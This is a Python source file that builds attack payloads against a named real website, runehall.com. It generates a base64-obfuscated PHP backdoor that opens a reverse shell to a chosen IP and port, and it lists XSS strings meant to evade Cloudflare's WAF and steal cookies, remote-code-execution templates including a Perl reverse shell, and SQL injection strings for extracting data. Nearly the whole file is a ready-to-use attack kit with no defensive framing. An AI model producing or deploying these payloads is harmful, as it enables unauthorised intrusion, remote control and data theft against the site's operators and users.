import base64

class RuneHallPayloads:
    """
    Customized payloads for runehall.com infrastructure.
    Focuses on Cloudflare evasion and PHP environment testing.
    """
    def __init__(self):
        self.domain = "runehall.com"
        
    def get_php_backdoor(self, callback_ip, callback_port):
        """
        Generates a stealthy PHP reverse shell payload.
        """
        # A stealthy, one-liner PHP reverse shell obfuscated
        raw_shell = f"python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{callback_ip}\",{callback_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
        b64_shell = base64.b64encode(raw_shell.encode()).decode()
        
        php_payload = f"<?php system(base64_decode('{b64_shell}')); ?>"
        return php_payload

    def get_cloudflare_xss(self):
        """
        Aggressive XSS payloads designed to bypass Cloudflare WAF.
        """
        return [
            # Using SVG and different event handlers
            '<svg/onload="eval(atob(\'YWxlcnQoJ05pZ2h0RnVyeSBYU1MnKQ==\'))">',
            # Using HTML5 features
            '<details open ontoggle="confirm(document.domain)">',
            # Obfuscated script tags
            '<scr<script>ipt>alert(1)</scr</script>ipt>',
            # Using MathML
            '<math><mtext><option><fake><script>alert(document.cookie)</script>',
            # Advanced WAF bypass using template literals
            '<svg/onload=eval(`al\\x65rt(1)`)>',
            # Using autofocus and onfocus
            '<input autofocus onfocus=alert(1)>',
            # Using video tag
            '<video><source onerror="alert(1)">'
        ]

    def get_rce_payloads(self):
        """
        Powerful RCE payloads for various environments.
        """
        return {
            "python_b64": "python3 -c 'import base64,os;os.system(base64.b64decode(\"{}\").decode())'",
            "perl_reverse_shell": "perl -e 'use Socket;$i=\"{}\";$p={};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
            "java_runtime_exec": "Runtime.getRuntime().exec(\"{}\")",
            "nodejs_child_process": "require('child_process').exec('{}')"
        }

    def get_sql_injection_payloads(self):
        """
        Advanced SQLi payloads for data extraction.
        """
        return [
            "' UNION SELECT NULL,NULL,NULL,CONCAT(0x7170706271,IFNULL(CAST(VERSION() AS CHAR),0x20),0x7171787a71),NULL-- -",
            "admin' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--",
            "1' AND 1=(SELECT COUNT(*) FROM information_schema.tables GROUP BY CONCAT(0x7170706271,(SELECT (ELT(1,1))),0x7171787a71,FLOOR(RAND(0)*2)))--",
            "'; WAITFOR DELAY '0:0:5'--"
        ]

if __name__ == "__main__":
    rh = RuneHallPayloads()
    print("--- RuneHall PHP Backdoor ---")
    print(rh.get_php_backdoor("127.0.0.1", 4444))
    print("\n--- RuneHall Cloudflare XSS ---")
    for p in rh.get_cloudflare_xss():
        print(p)
    print("\n--- RuneHall RCE Payloads ---")
    print(rh.get_rce_payloads())
    print("\n--- RuneHall SQLi Payloads ---")
    for p in rh.get_sql_injection_payloads():
        print(p)
